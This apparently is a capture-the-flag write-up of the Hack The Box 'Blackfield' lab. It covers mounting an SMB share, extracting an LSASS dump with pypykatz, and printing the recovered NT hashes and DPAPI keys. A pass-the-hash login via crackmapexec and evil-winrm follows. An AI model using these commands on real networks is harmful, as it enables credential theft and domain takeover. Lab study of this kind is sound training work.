
![[Pasted image 20231118134158.png]]
![[Pasted image 20231118134221.png]]

Got a new user
```
Ipwn3dYouCompany
```

Now i have thing for sure that memory seems sus to me let's enumerate it more
Through enumeration and googling found about lsass
What is an LSASS dump?

Adversaries commonly abuse the Local Security Authority Subsystem Service (LSASS) to **dump credentials for privilege escalation, data theft, and lateral movement**.

Let me unzip that file see what we can get it from there as we are no able to secret dump it using either support or audit2020



As we are not able to download the file cuz it's large in size one thing we can do it to mount it and cp the file that way or simply perform the operation in the mount itself
```
cme smb 10.10.10.192 -u 'audit2020' -p '#00^BlackKnight' --shares
```
![[Pasted image 20231118174113.png]]

```
mount -t cifs -o 'username=audit2020,password=#00^BlackKnight' //10.10.10.192/forensic /mnt
```
![[Pasted image 20231118174743.png]]

Will try to copy the file 
```
cp lsass.zip ~root/Active_Directory/Blackfield 
```
One thing i have noticed that if we are not able to run the unzip file either the file is corrupted or the file is incomplete which means we are not able to download it completely.
![[Pasted image 20231118175121.png]]
Finally able to unzip it which means we can finally run the pypykatz command 

https://www.whiteoaksecurity.com/blog/attacks-defenses-dumping-lsass-no-mimikatz/
https://en.hackndo.com/remote-lsass-dump-passwords/
```
pypykatz lsa minidump lsass.dmp
```

![[Pasted image 20231118175330.png]]

The command run in a second
```
pypykatz lsa minidump lsass.DMP 

username svc_backup
domainname BLACKFIELD
sid S-1-5-21-4194615774-2175524697-3563712290-1413
luid 406458
        == MSV ==
                Username: svc_backup
                Domain: BLACKFIELD
                LM: NA
                NT: 9658d1d1dcd9250115e2205d9f48400d
                SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c
                DPAPI: a03cd8e9d30171f3cfe8caad92fef621
        == WDIGEST [633ba]==
                username svc_backup
                domainname BLACKFIELD
                password None
                password (hex)
        == Kerberos ==
                Username: svc_backup
                Domain: BLACKFIELD.LOCAL
        == WDIGEST [633ba]==
                username svc_backup
                domainname BLACKFIELD
                password None
                password (hex)

username Administrator
domainname BLACKFIELD
sid S-1-5-21-4194615774-2175524697-3563712290-500
luid 153705
        == MSV ==
                Username: Administrator
                Domain: BLACKFIELD
                LM: NA
                NT: 7f1e4ff8c6a8e6b6fcae2d9c0572cd62
                SHA1: db5c89a961644f0978b4b69a4d2a2239d7886368
                DPAPI: 240339f898b6ac4ce3f34702e4a89550
        == WDIGEST [25869]==
                username Administrator
                domainname BLACKFIELD
                password None
                password (hex)
        == Kerberos ==
                Username: Administrator
                Domain: BLACKFIELD.LOCAL
        == WDIGEST [25869]==
                username Administrator
                domainname BLACKFIELD
                password None
                password (hex)
        == DPAPI [25869]==
                luid 153705
                key_guid d1f69692-cfdc-4a80-959e-bab79c9c327e
                masterkey 769c45bf7ceb3c0e28fb78f2e355f7072873930b3c1d3aef0e04ecbb3eaf16aa946e553007259bf307eb740f222decadd996ed660ffe648b0440d84cd97bf5a5
                sha1_masterkey d04452f8459a46460939ced67b971bcf27cb2fb9


username svc_backup
domainname BLACKFIELD
sid S-1-5-21-4194615774-2175524697-3563712290-1413
luid 406499
        == MSV ==
                Username: svc_backup
                Domain: BLACKFIELD
                LM: NA
                NT: 9658d1d1dcd9250115e2205d9f48400d
                SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c
                DPAPI: a03cd8e9d30171f3cfe8caad92fef621
        == WDIGEST [633e3]==
                username svc_backup
                domainname BLACKFIELD
                password None
                password (hex)
        == Kerberos ==
                Username: svc_backup
                Domain: BLACKFIELD.LOCAL
        == WDIGEST [633e3]==
                username svc_backup
                domainname BLACKFIELD
                password None
                password (hex)
        == DPAPI [633e3]==
                luid 406499
                key_guid 836e8326-d136-4b9f-94c7-3353c4e45770
                masterkey 0ab34d5f8cb6ae5ec44a4cb49ff60c8afdf0b465deb9436eebc2fcb1999d5841496c3ffe892b0a6fed6742b1e13a5aab322b6ea50effab71514f3dbeac025bdf
                sha1_masterkey 6efc8aa0abb1f2c19e101fbd9bebfb0979c4a991


== LogonSession ==
authentication_id 999 (3e7)
session_id 0
username DC01$
domainname BLACKFIELD
logon_server 
logon_time 2020-02-23T17:57:44.913221+00:00
sid S-1-5-18
luid 999
        == WDIGEST [3e7]==
                username DC01$
                domainname BLACKFIELD
                password None
                password (hex)
        == Kerberos ==
                Username: dc01$
                Domain: BLACKFIELD.LOCAL
        == WDIGEST [3e7]==
                username DC01$
                domainname BLACKFIELD
                password None
                password (hex)
        == DPAPI [3e7]==
                luid 999
                key_guid 0f7e926c-c502-4cad-90fa-32b78425b5a9
                masterkey ebbb538876be341ae33e88640e4e1d16c16ad5363c15b0709d3a97e34980ad5085436181f66fa3a0ec122d461676475b24be001736f920cd21637fee13dfc616
                sha1_masterkey ed834662c755c50ef7285d88a4015f9c5d6499cd
        == DPAPI [3e7]==
                luid 999
                key_guid f611f8d0-9510-4a8a-94d7-5054cc85a654
                masterkey 7c874d2a50ea2c4024bd5b24eef4515088cf3fe21f3b9cafd3c81af02fd5ca742015117e7f2675e781ce7775fcde2740ae7207526ce493bdc89d2ae3eb0e02e9
                sha1_masterkey cf1c0b79da85f6c84b96fd7a0a5d7a5265594477
        == DPAPI [3e7]==
                luid 999
                key_guid 31632c55-7a7c-4c51-9065-65469950e94e
                masterkey 825063c43b0ea082e2d3ddf6006a8dcced269f2d34fe4367259a0907d29139b58822349e687c7ea0258633e5b109678e8e2337d76d4e38e390d8b980fb737edb
                sha1_masterkey 6f3e0e7bf68f9a7df07549903888ea87f015bb01
        == DPAPI [3e7]==
                luid 999
                key_guid 7e0da320-072c-4b4a-969f-62087d9f9870
                masterkey 1fe8f550be4948f213e0591eef9d876364246ea108da6dd2af73ff455485a56101067fbc669e99ad9e858f75ae9bd7e8a6b2096407c4541e2b44e67e4e21d8f5
                sha1_masterkey f50955e8b8a7c921fdf9bac7b9a2483a9ac3ceed

```

```
crackmapexec smb 10.10.10.192 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d
```
![[Pasted image 20231118180544.png]]

```
cme smb 10.10.10.192 -u 'svc_backup' -H 9658d1d1dcd9250115e2205d9f48400d --shares
```
![[Pasted image 20231118181122.png]]

Administrator hash didn't worked
![[Pasted image 20231118181400.png]]

Got the initial Access
```
evil-winrm -i 10.10.10.192 -P 5985 -u svc_backup -H '9658d1d1dcd9250115e2205d9f48400d'
```
![[Pasted image 20231118181613.png]]

```
3920bb317a0bef51027e2852be64b543
```
